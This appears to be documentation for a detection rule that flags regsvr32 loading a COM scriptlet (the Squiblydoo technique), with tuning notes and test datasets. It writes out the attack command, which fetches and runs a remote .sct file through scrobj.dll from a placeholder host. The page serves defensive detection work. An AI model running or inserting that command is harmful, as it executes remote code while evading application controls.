# Regsvr32 loading a COM scriptlet (Squiblydoo)

**Rule:** [`rules/windows/defense_evasion/proc_regsvr32_scriptlet.yml`](../../rules/windows/defense_evasion/proc_regsvr32_scriptlet.yml) · **ATT&CK:** T1218.010 Regsvr32 · **Level:** high

## What it detects
`regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll` fetches and runs a scriptlet through the scriptlet runtime. It runs code from a signed binary, can pull it over HTTP, and leaves nothing registered. The rule needs regsvr32, `scrobj` and an `/i:` or `-i:` switch.

## Data source
Sysmon event 1.

## Known false positives
None known. Normal DLL registration does not involve scrobj.dll.

## Tuning notes
- Some variants reference `scrobj.dll` by full path or with different casing; `contains` is case-insensitive so both are caught.
- A renamed regsvr32 still carries `OriginalFileName: REGSVR32.EXE`, which the image selection includes.

## Test evidence
OTRF `empire_launcher_sct_regsvr32`, EVTX-ATTACK-SAMPLES `exec_sysmon_lobin_regsvr32_sct`, and `sysmon_1_persist_bitsjob_SetNotifyCmdLine`, where a BITS job's notify command launches the same scriptlet.
